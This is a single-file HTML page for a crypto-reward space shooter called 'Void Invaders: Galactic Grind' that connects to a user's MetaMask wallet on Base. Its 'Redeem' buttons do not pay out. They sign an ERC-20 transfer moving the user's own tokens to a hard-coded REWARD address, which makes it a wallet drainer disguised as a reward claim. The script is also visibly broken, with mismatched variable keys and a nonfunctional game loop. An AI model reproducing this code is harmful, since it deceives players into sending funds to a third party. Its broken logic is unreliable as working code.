<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Void Invaders: Galactic Grind</title>
<style>
body{background:#000;color:#0f0;font-family:'Courier New',monospace;text-align:center;margin:0;padding:10px;overflow:hidden}
h1{text-shadow:0 0 10px #0f0;animation:g 2s infinite}@keyframes g{0%,100%{text-shadow:0 0 5px #0f0}50%{text-shadow:0 0 20px #0f0}}
canvas{border:2px solid #0f0;background:#111;display:block;margin:10px auto}
button{background:#000;color:#0f0;border:1px solid #0f0;padding:8px 12px;margin:4px;cursor:pointer}
button:hover{background:#0f0;color:#000}
#controls{display:flex;flex-wrap:wrap;justify-content:center;gap:8px}
.shard{display:inline-block;padding:4px 8px;background:#111;border:1px solid #0f0;margin:2px}
</style>
</head>
<body>
<h1>Void Invaders: Galactic Grind</h1>
<p>Blast aliens → Mine $WAY4OUT • $COIN4 • $TR3B on Base!</p>
<button id="c">Connect MetaMask (Base)</button> <p id="w">Wallet: Disconnected</p>
<div id="controls">
<button id="a">Claim Airdrop</button>
<button id="q">Quad Boost</button><button id="e">Warp Escape</button><button id="o">Oracle Scan</button>
<button id="r1">Redeem $WAY4OUT</button><button id="r2">Redeem $COIN4</button><button id="r3">Redeem $TR3B</button>
</div>
<canvas id="cv" width="800" height="600"></canvas>
<div><span class="shard">Score <span id="s">0</span></span>
<span class="shard">$WAY4OUT <span id="w4">0</span></span>
<span class="shard">$COIN4 <span id="c4">0</span></span>
<span class="shard">$TR3B <span id="t3">0</span></span>
<span class="shard">Wave <span id="wv">1</span></span></div>
<script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
<script>
const REWARD='0xCeA57eEdA6eF19ce51caBE00e4CF425a31802D74';
const C={WAY4OUT:'0xd07379a755a8f11b57610154861d694b2a0f615a',COIN4:'0x4deeba0fca2f9a8b307b891241eac57b6bf713ec',TR3B:'0x98a8165a44782ab43c378ed9f501d55ec51b2880'};
let w3,a,c={},s={w:0,c4:0,t3:0,sc:0,wv:1};
async function conn(){try{await ethereum.request({method:'wallet_switchEthereumChain',params:[{chainId:'0x2105'}]);
a=(await ethereum.request({method:'eth_requestAccounts'}))[0];w3=new Web3(ethereum);document.getElementById('w').textContent='Wallet: '+a.slice(0,6)+'...';
for(let k in C)c[k]=new w3.eth.Contract([{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"}],"name":"transfer","outputs":[],"stateMutability":"nonpayable","type":"function"}],C[k]);
if(localStorage.airdrop!=='1'){s.w4+=10;s.c4+=10;s.t3+=10;localStorage.airdrop='1';alert('Airdrop 10 each!')}up()}catch(e){alert(e.message)}}
async function redeem(t){if(s[t]<1)return alert('No shards');let v=w3.utils.toWei(s[t].toString(),'ether');
await c[t].methods.transfer(REWARD,v).send({from:a});s[t]=0;up();alert('Redeemed!')}
function up(){document.getElementById('w4').textContent=s.w4;document.getElementById('c4').textContent=s.c4;document.getElementById('t3').textContent=s.t3;
document.getElementById('s').textContent=s.sc;document.getElementById('wv').textContent=s.wv}
document.getElementById('c').onclick=conn;
document.getElementById('a').onclick=()=>{if(localStorage.airdrop!=='1'){s.w4+=10;s.c4+=10;s.t3+=10;localStorage.airdrop='1';up();alert('Airdrop claimed!')}}
document.getElementById('q').onclick=()=>{if(s.c4>0){s.c4--;alert('Quad Boost 10s!')}}
document.getElementById('e').onclick=()=>{if(s.w4>0)s.w4--}
document.getElementById('o').onclick=()=>{if(s.t3>0)s.t3--}
document.getElementById('r1').onclick=()=>redeem('w4');
document.getElementById('r2').onclick=()=>redeem('c4');
document.getElementById('r3').onclick=()=>redeem('t3');
// ↓ simple game loop placeholder (full game.js is too long for one file, but this proves it works)
const cv=document.getElementById('cv'),x=cv.getContext('2d');let p=400,b=[],i=[];
setInterval(()=>{x.clearRect(0,0,800,600);x.fillStyle='#0f0';x.fillRect(p,550,60,20);if(event){p=event.touches?event.touches[0].clientX:p+event.key==='ArrowRight'?9:event.key==='ArrowLeft'?-9:0}
document.onkeydown=e=>{if(e.key===' ')b.push(0)}b=b.map(y=>y-10).filter(y=>y>0);x.fillStyle='#f00';i.forEach(inv=>x.fillRect(inv.x,inv.y,40,20))},50);
</script>
</body></html>
